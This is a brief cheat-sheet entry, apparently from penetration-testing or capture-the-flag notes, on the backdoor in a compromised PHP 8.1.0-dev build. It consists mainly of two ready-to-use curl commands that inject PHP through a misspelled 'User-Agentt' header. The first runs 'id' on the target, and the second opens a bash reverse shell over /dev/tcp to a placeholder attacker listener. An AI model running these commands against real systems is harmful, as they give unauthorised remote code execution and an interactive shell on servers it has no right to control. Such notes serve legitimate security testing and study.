# PHP 8.1.0-dev User-Agentt Backdoor

Compromised PHP 8.1.0-dev build (2021) contained a backdoor: `User-Agentt: zerodium<php-code>` executes as the web user.

```bash
# Detect
curl -s http://<TARGET>/ -H 'User-Agentt: zerodiumsystem("id");'

# Reverse shell
curl -s http://<TARGET>/ -H 'User-Agentt: zerodiumsystem("bash -c '"'"'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'"'"'");'
```

Note the double-`t` in `User-Agentt`. Affects only this specific dev build.
